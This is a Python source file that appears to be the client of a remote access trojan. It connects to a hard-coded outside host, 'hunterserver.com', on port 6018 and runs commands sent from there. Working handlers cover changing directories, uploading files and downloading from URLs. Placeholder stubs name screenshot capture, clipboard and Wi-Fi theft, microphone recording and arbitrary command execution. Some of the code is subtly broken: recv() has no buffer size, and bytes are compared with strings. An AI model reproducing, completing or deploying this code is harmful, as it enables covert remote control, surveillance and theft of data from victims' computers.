import socket, subprocess, os, base64
from client_commands import *


def run(host, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((host, port))
        except:
            return
        while True:
            command = client_socket.recv()
            if command == "exit":
                break
            elif command == "pwd":
                pwd(client_socket)
            elif command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except:
                    continue
            elif command == "sysinfo":
                pass
            elif command[:8] == "download":
                pass
            elif command[:6] == "upload":
                uploaded_data = upload(client_socket, command[7:])
                if uploaded_data.startswith("[!] Error"):
                    continue
            elif command == "netstat":
                pass
            elif command[:4] == "kill":
                pass
            elif command == "cpl":
                pass
            elif command[:6] == "urldwn":
                urldownload(command[7:])
            elif command[:3] == "run":
                pass
            elif command[:7] == "prt_scr":
                pass
            elif command == "wifi_lst":
                pass
            elif command == "clipboard":
                pass
            elif command[:21] == "mic_record --duration":
                pass
            else:  # * Run Other System Commands
                pass
    except:
        return


if "__main__" == __name__:
    run(host="hunterserver.com", port=6018)
